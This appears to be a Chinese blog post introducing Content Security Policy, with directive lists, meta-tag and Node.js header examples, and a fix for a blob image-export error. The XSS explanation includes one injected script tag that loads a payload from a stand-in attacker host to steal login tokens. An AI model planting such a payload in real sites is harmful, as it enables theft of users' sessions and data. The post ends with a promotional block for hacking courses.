
--- 
title:  CSP 内容安全策略入门 
tags: []
categories: [] 

---
### 1. 前言

最近在修复公司系统一个图片导出的功能，无法导出图片

<img src="https://img-blog.csdnimg.cn/img_convert/6cd9ec970e762d1493b6c518fa163dbb.png" alt="">，拒绝加载图片`blob:http://xxxx`，违反`Content Security Policy`， 于是就 google 一把，这个是什么玩意？

### 2. Content Security Policy

这是网站安全方面的内容了，对于网站跨域的问题错误不少见，跨域是由于导致的，只允许加载来自自身的origin 域的数据，即  是不能加载来自  的数据的，这样就解决大部分的安全问题，恶意代码就无法在浏览器端执行获取用户的安全隐私。毕竟，“道高一丈，魔高一尺”，恶意方总有方法绕过同源策略的限制，如跨站脚本攻击，比如网站有个留言板功能，但后台未对用户输入进行过滤，攻击者可以在留言编辑框中输入

```
&lt;script src="http://www.hacker.org/xss.payload.js"&gt;&lt;/script&gt; 

```

，xss.payload.js可以获取老浏览用户的信息，如的登录token、用户的个人资料等。以前的防御手段主要是对用户输入进行过滤如：去除html标签，实体化，关键字过滤等等，这样一来，最终的结果就是后台的大多数代码都是在做字符串验证，非常的让人不舒服。所以W3 org引入了CSP，它从另外一层面给浏览器提供了保护。

看看 MDN 的解释：

>  
 内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 


本文主要讲述以下几点内容：
- CSP 原理- CSP 使用规则- CSP 的应用：解决图片导出的问题
#### 2.1 原理

CSP 通过告诉浏览器一系列的规则，严格规定页面中哪些资源允许有哪些资源，不在指定范围内的统统拒绝，这样一来，从源头上杜绝了不可信的xss payload。

#### 2.2 规则

无论是在 `&lt;meta&gt;` 标签还是在 header 中指定，其值的格式是统一的，都由一系列的指令组成的。

```
Content-Security-Policy: &lt;policy-directive&gt;; &lt;policy-directive&gt; 

```

这里的指令是CSP 规定中用以详细描述某种资源的判断，比如前面的错误图片中，`img-src` 指定图片，下面列出一些常用的指令
- child-src：为web workers和其他内嵌浏览器内容（例如用和加载到页面的内容）定义合法的源地址。- connect-src：限制能通过脚本接口加载的UR- default-src：为其他取指令提供备用服务fetch directives。- font-src：设置允许通过@font-face加载的字体源地址。- img-src: 限制图片和图标的源地址- frame-src： 设置允许通过类似和标签加载的内嵌内容的源地址- 限制application manifest文件的源地址。- object-src：限制、、标签的源地址。- media-src：限制通过、或标签加载的媒体文件的源地址。- prefetch-src ：指定预加载或预渲染的允许源地址。- script-src：限制JavaScript的源地址。- style-src：限制层叠样式表文件源。- worker-src：限制Worker、SharedWorker或者ServiceWorker脚本源。
更多指令，见 

#### 指令可接受的值

指令后面跟的来源，有两种写法：
- 预设值- URI 通配符
##### 2.2.1 预设值
- none 不匹配任何东西。- self 匹配当前域，但不包括子域。比如 example.com 可以，api.example.com 则会匹配失败。- unsafe-inline 允许内嵌的脚本及样式。- unsafe-eval 允许通过字符串动态创建的脚本执行，比如 eval，setTimeout 等
##### 2.2.2 URI

除了上面配置的预设值，还可以通过提供完整的URI或带通配符 `*` 的地址来匹配，以指定资源的合法来源，跟配置跨域的相应头一致，参考
- **😕/**.example.com:* 会匹配所有 example.com 的子域名，但不包括 example.com。-  和  是两个不同的 URI。-  和  也是是两个不同的 URI，虽然网站默认端口就是 80
#### 2.3 实现途径

默认情况下，如果站点未指定 CSP 规则，浏览器不会默认开启，只受同源策略的影响。

```
&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8" /&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge" /&gt;
    &lt;title&gt;CSP 安全策略&lt;/title&gt;
    &lt;style&gt;
      h1 {
        color: cornflowerblue;
      }
    &lt;/style&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Hello CSP !&lt;/h1&gt;
    &lt;script&gt;
      window.onload = () =&gt; alert("Hi, Jecyu");
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt; 

```

<img src="https://img-blog.csdnimg.cn/img_convert/60bd9fc4d57c08573cc35e76b633c677.png" alt="">

##### 2.3.1 HTML 中添加 标签来指定 Content-Security-Policy 规则

```
 &lt;head&gt;
    ...
     &lt;meta http-equiv="Content-security-Policy" content="default-src 'self'" /&gt;
   ...
  &lt;/head&gt; 

```

效果：

<img src="https://img-blog.csdnimg.cn/img_convert/454c0247a45630983c89c997441de4ef.png" alt="">

配置站点默认只相信同域的资源，但注意，这个设置并不包含内联的情况，所以结果会如上图。如何修复它呢。如果我们想要允许页面内的内联脚本或样式，则可以通过添加`unsafe-inline` 指令值来修复。

```
&lt;meta  http-equiv="Content-security-Policy"  content="default-src 'self' 'unsafe-inline'"
    /&gt; 

```

default-src，如果指定了它的值，则相当于改变了这些未指定的指令的默认值。可以理解为，上面 style-src 如果没指定，本来其默认值是 *，可以加载所有来源的样式，但设置 default-src 后，默认值就成了 default-src 指定的值。

##### 2.3.2 服务器添加 Content-Security-Policy 响应头来指定规则

这里使用 node.js

```
const http = require("http");
const fs = require("fs");
const PORT = 8088;
const path = require("path");
console.log();
// 创建一个 http 服务
const server = http.createServer((request, response) =&gt; {
  response.setHeader("Content-Type", "text/html;charset='utf-8'");
  response.setHeader("Access-Control-Allow-Origin", "*");
  response.setHeader(
    "Content-security-Policy",
    "default-src 'self' 'unsafe-inline'"
  );
  // 读文件
  fs.readFile(path.resolve(__dirname, "./index.html"), function(err, data) {
    if (err) {
      console.log(`index.html loading is failed` + err);
    } else {
      // 返回 HTML 页面
      response.end(data);
    }
  });
});

// 启动服务，监听端口
server.listen(PORT, () =&gt; {
  console.log("服务启动成功，正在监听: ", PORT);
}); 

```

<img src="https://img-blog.csdnimg.cn/img_convert/93cc2e267b46623f4be2cf752838faf5.png" alt="">

##### 2.3.3 优先级
- 对于设置了多次响应头的情况，最严格的规则会生效（无论是在 中，还是 header 中）- 同一指令多次指定，以第一个为准，后续的会被忽略。
### 3. 解决图片导出的问题

看看了请求首页的请求响应参数，如下： <img src="https://img-blog.csdnimg.cn/img_convert/ad7487c2d3d737fb17019e041b91e594.png" alt="">

通过前面的学习后，得知可以通过HTML或者Header进行对 CSP 规则的设置，从而避开限制。这里并没有设置 `img-src`，由于设置 `default-src 'self' data: *;`，因此图片只能加载同域的图片data:前缀的值

#### 3.1 解决方案一：添加 img-src 指令

从图片可知直接设置 `img-src *`没有包括 `blob`的数据规则， 来自  <img src="https://img-blog.csdnimg.cn/img_convert/12805fbe73ffb07ef4f05d80cb0d5715.png" alt="">

因此，需要添加声明规则，`default-src blob: *`或`img-src blob: *`

#### 3.2 解决方案二： 转换图片的格式

在动态设置图片src的时候，先把blob 转为 `base64` 形式，这样就符合了 CSR 的设置规则了，图片就可以添加到 HTML中了。

```
 var base64data = "";
   xhr.onload = function() {
          img = new Image();
          var reader = new window.FileReader();
          reader.readAsDataURL(this.response);
          reader.onloadend = function() {
            base64data = reader.result;
            img.src = base64data;
          };
          img.addEventListener(
            "load",
            function() {
              deferred.resolve(img);
              URL.revokeObjectURL(_url);
            },
            false
          );
          img.addEventListener("error", function(errorEvent) {
            deferred.resolve({
              error: errorEvent,
              image: img
            });
            URL.revokeObjectURL(_url);
          });
        };
        xhr.onerror = function() {
          var img = new Image();
          deferred.resolve(img);
        };
        xhr.open("GET", url, true);
        xhr.responseType = "blob";
        xhr.send();
      } 

```

### 4. 浏览器兼容性
- 
(全文完)

## 学习资料分享

当然，**只给予计划不给予学习资料的行为无异于耍流氓**，### 如果你对网络安全入门感兴趣，那么你点击这里**👉**

**如果你对网络安全感兴趣，学习资源免费分享，保证100%免费！！！（嘿客入门教程）**

**👉网安（嘿客）全套学习视频👈**

我们在看视频学习的时候，不能光动眼动脑不动手，比较科学的学习方法是在理解之后运用它们，这时候练手项目就很适合了。

#### 

#### <img src="https://img-blog.csdnimg.cn/img_convert/d1c617b78ee48eda7601e5b803e69276.png" alt="img">

#### **👉网安（嘿客红蓝对抗）所有方向的学习路线****👈**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

#### <img src="https://img-blog.csdnimg.cn/img_convert/de55dfd737dae0cf88e416d0454b17a8.png" alt="img">

#### 学习资料工具包

压箱底的好资料，全面地介绍网络安全的基础理论，包括逆向、八层网络防御、汇编语言、白帽子web安全、密码学、网络安全协议等，将基础理论和主流工具的应用实践紧密结合，有利于读者理解各种主流工具背后的实现机制。

<img src="https://img-blog.csdnimg.cn/9609a53465cf4253b492a5185896fa71.png" alt="在这里插入图片描述">

**面试题资料**

独家渠道收集京东、360、天融信等公司测试题！进大厂指日可待！ <img src="https://img-blog.csdnimg.cn/f5f267c281c543fb9cc9af53b9003a37.png" alt="在这里插入图片描述">

#### **👉<strong><strong>嘿客必备开发工具**</strong>👈</strong>

工欲善其事必先利其器。学习**嘿**客常用的开发软件都在这里了，给大家节省了很多时间。

#### 这份完整版的网络安全（**嘿**客）全套学习资料已经上传至CSDN官方，朋友们如果需要点击下方链接**也可扫描下方微信二v码获取网络工程师全套资料**【保证100%免费】

#### <img src="https://img-blog.csdnimg.cn/img_convert/16c400294b6fda8f01400f24f1f12b0c.png" alt="在这里插入图片描述">

#### 如果你对网络安全入门感兴趣，那么你点击这里**👉**
